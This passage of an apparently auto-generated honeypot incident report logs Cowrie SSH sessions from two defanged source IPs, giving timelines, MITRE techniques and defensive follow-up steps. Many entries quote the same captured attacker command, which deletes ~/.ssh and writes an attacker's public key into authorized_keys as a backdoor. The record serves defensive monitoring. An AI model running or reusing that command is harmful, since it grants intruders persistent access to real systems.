| `2026-06-03 14:48:26` | `cowrie.command.failed` |
| `2026-06-03 14:48:26` | `cowrie.log.closed` |
| `2026-06-03 14:48:26` | `cowrie.session.params` |
| `2026-06-03 14:48:26` | `cowrie.command.input` |
| `2026-06-03 14:48:26` | `cowrie.session.file_download` |
| `2026-06-03 14:48:26` | `cowrie.log.closed` |
| `2026-06-03 14:48:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.2[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.154.2[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dea482711222

| Field | Detail |
|---|---|
| **Source IP** | `8.154.2[.]19` |
| **First Seen** | 2026-06-03 14:48 |
| **Last Seen** | 2026-06-03 14:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:48:28` | `cowrie.session.connect` |
| `2026-06-03 14:48:28` | `cowrie.client.version` |
| `2026-06-03 14:48:28` | `cowrie.client.kex` |
| `2026-06-03 14:48:29` | `cowrie.login.success` |
| `2026-06-03 14:48:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.2[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.154.2[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d4bebd5b897

| Field | Detail |
|---|---|
| **Source IP** | `8.154.2[.]19` |
| **First Seen** | 2026-06-03 14:48 |
| **Last Seen** | 2026-06-03 14:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:48:45` | `cowrie.session.connect` |
| `2026-06-03 14:48:45` | `cowrie.client.version` |
| `2026-06-03 14:48:45` | `cowrie.client.kex` |
| `2026-06-03 14:48:46` | `cowrie.login.success` |
| `2026-06-03 14:48:46` | `cowrie.session.params` |
| `2026-06-03 14:48:46` | `cowrie.command.input` |
| `2026-06-03 14:48:46` | `cowrie.command.failed` |
| `2026-06-03 14:48:46` | `cowrie.log.closed` |
| `2026-06-03 14:48:46` | `cowrie.session.params` |
| `2026-06-03 14:48:46` | `cowrie.command.input` |
| `2026-06-03 14:48:47` | `cowrie.session.file_download` |
| `2026-06-03 14:48:47` | `cowrie.log.closed` |
| `2026-06-03 14:48:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.2[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.154.2[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daaff261f662

| Field | Detail |
|---|---|
| **Source IP** | `8.154.2[.]19` |
| **First Seen** | 2026-06-03 14:48 |
| **Last Seen** | 2026-06-03 14:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:48:49` | `cowrie.session.connect` |
| `2026-06-03 14:48:49` | `cowrie.client.version` |
| `2026-06-03 14:48:49` | `cowrie.client.kex` |
| `2026-06-03 14:48:50` | `cowrie.login.success` |
| `2026-06-03 14:48:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.2[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.154.2[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70bd998e568d

| Field | Detail |
|---|---|
| **Source IP** | `8.154.2[.]19` |
| **First Seen** | 2026-06-03 14:49 |
| **Last Seen** | 2026-06-03 14:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:49:29` | `cowrie.session.connect` |
| `2026-06-03 14:49:29` | `cowrie.client.version` |
| `2026-06-03 14:49:30` | `cowrie.client.kex` |
| `2026-06-03 14:49:30` | `cowrie.login.success` |
| `2026-06-03 14:49:30` | `cowrie.session.params` |
| `2026-06-03 14:49:30` | `cowrie.command.input` |
| `2026-06-03 14:49:30` | `cowrie.command.failed` |
| `2026-06-03 14:49:31` | `cowrie.log.closed` |
| `2026-06-03 14:49:31` | `cowrie.session.params` |
| `2026-06-03 14:49:31` | `cowrie.command.input` |
| `2026-06-03 14:49:31` | `cowrie.session.file_download` |
| `2026-06-03 14:49:31` | `cowrie.log.closed` |
| `2026-06-03 14:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.2[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.154.2[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d13ed35b396

| Field | Detail |
|---|---|
| **Source IP** | `8.154.2[.]19` |
| **First Seen** | 2026-06-03 14:49 |
| **Last Seen** | 2026-06-03 14:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:49:33` | `cowrie.session.connect` |
| `2026-06-03 14:49:33` | `cowrie.client.version` |
| `2026-06-03 14:49:33` | `cowrie.client.kex` |
| `2026-06-03 14:49:34` | `cowrie.login.success` |
| `2026-06-03 14:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.2[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.154.2[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46209d016212

| Field | Detail |
|---|---|
| **Source IP** | `52.177.169[.]196` |
| **First Seen** | 2026-06-03 14:52 |
| **Last Seen** | 2026-06-03 14:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:52:29` | `cowrie.session.connect` |
| `2026-06-03 14:52:29` | `cowrie.client.version` |
| `2026-06-03 14:52:30` | `cowrie.client.kex` |
| `2026-06-03 14:52:30` | `cowrie.login.success` |
| `2026-06-03 14:52:31` | `cowrie.session.params` |
| `2026-06-03 14:52:31` | `cowrie.command.input` |
| `2026-06-03 14:52:31` | `cowrie.command.failed` |
| `2026-06-03 14:52:31` | `cowrie.log.closed` |
| `2026-06-03 14:52:32` | `cowrie.session.params` |
| `2026-06-03 14:52:32` | `cowrie.command.input` |
| `2026-06-03 14:52:32` | `cowrie.session.file_download` |
| `2026-06-03 14:52:32` | `cowrie.log.closed` |
| `2026-06-03 14:52:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.177.169[.]196` to AbuseIPDB if not already reported
- [ ] Block `52.177.169[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-615b4a0a76cf

| Field | Detail |
|---|---|
| **Source IP** | `8.154.2[.]19` |
| **First Seen** | 2026-06-03 14:52 |
| **Last Seen** | 2026-06-03 14:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:52:32` | `cowrie.session.connect` |
| `2026-06-03 14:52:32` | `cowrie.client.version` |
| `2026-06-03 14:52:33` | `cowrie.client.kex` |
| `2026-06-03 14:52:33` | `cowrie.login.success` |
| `2026-06-03 14:52:33` | `cowrie.session.params` |
| `2026-06-03 14:52:33` | `cowrie.command.input` |
| `2026-06-03 14:52:33` | `cowrie.command.failed` |
| `2026-06-03 14:52:34` | `cowrie.log.closed` |
| `2026-06-03 14:52:34` | `cowrie.session.params` |
| `2026-06-03 14:52:34` | `cowrie.command.input` |
| `2026-06-03 14:52:34` | `cowrie.session.file_download` |
| `2026-06-03 14:52:34` | `cowrie.log.closed` |
| `2026-06-03 14:52:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.2[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.154.2[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8208079d3748

| Field | Detail |
|---|---|
| **Source IP** | `52.177.169[.]196` |
| **First Seen** | 2026-06-03 14:52 |
| **Last Seen** | 2026-06-03 14:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:52:34` | `cowrie.session.connect` |
| `2026-06-03 14:52:34` | `cowrie.client.version` |
| `2026-06-03 14:52:35` | `cowrie.client.kex` |
| `2026-06-03 14:52:35` | `cowrie.login.success` |
| `2026-06-03 14:52:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.177.169[.]196` to AbuseIPDB if not already reported
- [ ] Block `52.177.169[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd95eb0d3ff0

| Field | Detail |
|---|---|
| **Source IP** | `8.154.2[.]19` |
| **First Seen** | 2026-06-03 14:52 |
| **Last Seen** | 2026-06-03 14:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:52:36` | `cowrie.session.connect` |
| `2026-06-03 14:52:36` | `cowrie.client.version` |
| `2026-06-03 14:52:36` | `cowrie.client.kex` |
| `2026-06-03 14:52:37` | `cowrie.login.success` |
| `2026-06-03 14:52:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.2[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.154.2[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e63e3939fd5

| Field | Detail |
|---|---|
| **Source IP** | `8.154.2[.]19` |
| **First Seen** | 2026-06-03 14:53 |
| **Last Seen** | 2026-06-03 14:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:53:20` | `cowrie.session.connect` |
| `2026-06-03 14:53:20` | `cowrie.client.version` |
| `2026-06-03 14:53:20` | `cowrie.client.kex` |
| `2026-06-03 14:53:20` | `cowrie.login.success` |
| `2026-06-03 14:53:21` | `cowrie.session.params` |
| `2026-06-03 14:53:21` | `cowrie.command.input` |
| `2026-06-03 14:53:21` | `cowrie.command.failed` |
| `2026-06-03 14:53:21` | `cowrie.log.closed` |
| `2026-06-03 14:53:21` | `cowrie.session.params` |
| `2026-06-03 14:53:21` | `cowrie.command.input` |
| `2026-06-03 14:53:21` | `cowrie.session.file_download` |
| `2026-06-03 14:53:21` | `cowrie.log.closed` |
| `2026-06-03 14:53:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.2[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.154.2[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cbebf3ba2ac

| Field | Detail |
|---|---|
| **Source IP** | `8.154.2[.]19` |
| **First Seen** | 2026-06-03 14:53 |
| **Last Seen** | 2026-06-03 14:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:53:23` | `cowrie.session.connect` |
| `2026-06-03 14:53:23` | `cowrie.client.version` |
| `2026-06-03 14:53:23` | `cowrie.client.kex` |
| `2026-06-03 14:53:24` | `cowrie.login.success` |
| `2026-06-03 14:53:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.2[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.154.2[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64f175d026ba

| Field | Detail |
|---|---|
| **Source IP** | `8.154.2[.]19` |
| **First Seen** | 2026-06-03 14:54 |
| **Last Seen** | 2026-06-03 14:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:54:00` | `cowrie.session.connect` |
| `2026-06-03 14:54:00` | `cowrie.client.version` |
| `2026-06-03 14:54:00` | `cowrie.client.kex` |
| `2026-06-03 14:54:01` | `cowrie.login.success` |
| `2026-06-03 14:54:01` | `cowrie.session.params` |
| `2026-06-03 14:54:01` | `cowrie.command.input` |
| `2026-06-03 14:54:01` | `cowrie.command.failed` |
| `2026-06-03 14:54:02` | `cowrie.log.closed` |
| `2026-06-03 14:54:02` | `cowrie.session.params` |
| `2026-06-03 14:54:02` | `cowrie.command.input` |
| `2026-06-03 14:54:02` | `cowrie.session.file_download` |
| `2026-06-03 14:54:02` | `cowrie.log.closed` |
| `2026-06-03 14:54:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.2[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.154.2[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc986e56f902

| Field | Detail |
|---|---|
| **Source IP** | `8.154.2[.]19` |
| **First Seen** | 2026-06-03 14:54 |
| **Last Seen** | 2026-06-03 14:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:54:04` | `cowrie.session.connect` |
| `2026-06-03 14:54:04` | `cowrie.client.version` |
| `2026-06-03 14:54:04` | `cowrie.client.kex` |
| `2026-06-03 14:54:05` | `cowrie.login.success` |
| `2026-06-03 14:54:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.2[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.154.2[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbdc8b20b548

| Field | Detail |
|---|---|
| **Source IP** | `8.154.2[.]19` |
| **First Seen** | 2026-06-03 14:54 |
| **Last Seen** | 2026-06-03 14:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:54:22` | `cowrie.session.connect` |
| `2026-06-03 14:54:22` | `cowrie.client.version` |
| `2026-06-03 14:54:22` | `cowrie.client.kex` |
| `2026-06-03 14:54:22` | `cowrie.login.success` |
| `2026-06-03 14:54:23` | `cowrie.session.params` |
| `2026-06-03 14:54:23` | `cowrie.command.input` |
| `2026-06-03 14:54:23` | `cowrie.command.failed` |
| `2026-06-03 14:54:23` | `cowrie.log.closed` |
| `2026-06-03 14:54:23` | `cowrie.session.params` |
| `2026-06-03 14:54:23` | `cowrie.command.input` |
| `2026-06-03 14:54:23` | `cowrie.session.file_download` |
| `2026-06-03 14:54:23` | `cowrie.log.closed` |
| `2026-06-03 14:54:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.2[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.154.2[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ab4fcffcbeb

| Field | Detail |
|---|---|
| **Source IP** | `8.154.2[.]19` |
| **First Seen** | 2026-06-03 14:54 |
| **Last Seen** | 2026-06-03 14:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:54:25` | `cowrie.session.connect` |
| `2026-06-03 14:54:25` | `cowrie.client.version` |
| `2026-06-03 14:54:26` | `cowrie.client.kex` |
| `2026-06-03 14:54:26` | `cowrie.login.success` |
| `2026-06-03 14:54:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.154.2[.]19` to AbuseIPDB if not already reported
- [ ] Block `8.154.2[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1da4a5eb4c4e

| Field | Detail |
|---|---|
| **Source IP** | `52.177.169[.]196` |
| **First Seen** | 2026-06-03 14:54 |
| **Last Seen** | 2026-06-03 14:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:54:39` | `cowrie.session.connect` |
| `2026-06-03 14:54:39` | `cowrie.client.version` |
| `2026-06-03 14:54:39` | `cowrie.client.kex` |
| `2026-06-03 14:54:40` | `cowrie.login.success` |
| `2026-06-03 14:54:41` | `cowrie.session.params` |
| `2026-06-03 14:54:41` | `cowrie.command.input` |
| `2026-06-03 14:54:41` | `cowrie.command.failed` |
| `2026-06-03 14:54:41` | `cowrie.log.closed` |
| `2026-06-03 14:54:41` | `cowrie.session.params` |
| `2026-06-03 14:54:41` | `cowrie.command.input` |
| `2026-06-03 14:54:41` | `cowrie.session.file_download` |
| `2026-06-03 14:54:41` | `cowrie.log.closed` |
| `2026-06-03 14:54:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.177.169[.]196` to AbuseIPDB if not already reported
- [ ] Block `52.177.169[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acbe8e41a62f

| Field | Detail |
|---|---|
| **Source IP** | `52.177.169[.]196` |
| **First Seen** | 2026-06-03 14:54 |
| **Last Seen** | 2026-06-03 14:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 14:54:44` | `cowrie.session.connect` |
| `2026-06-03 14:54:44` | `cowrie.client.version` |
| `2026-06-03 14:54:44` | `cowrie.client.kex` |
| `2026-06-03 14:54:45` | `cowrie.login.success` |
| `2026-06-03 14:54:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `52.177.169[.]196` to AbuseIPDB if not already reported
- [ ] Block `52.177.169[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c2c35f577c7

